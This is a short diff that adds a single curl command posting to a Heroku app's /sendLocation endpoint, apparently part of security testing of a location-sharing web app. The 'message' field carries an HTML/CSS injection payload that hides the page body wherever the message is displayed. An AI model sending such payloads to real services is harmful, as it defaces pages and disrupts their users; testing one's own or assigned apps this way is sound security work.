@@ -1,0 +1,5 @@
+curl --data "login=mchow&lat=0&lng=0&message=<style> body{display:none}; </style>" http://rocky-headland-1889.herokuapp.com/sendLocation
+
+
+
+
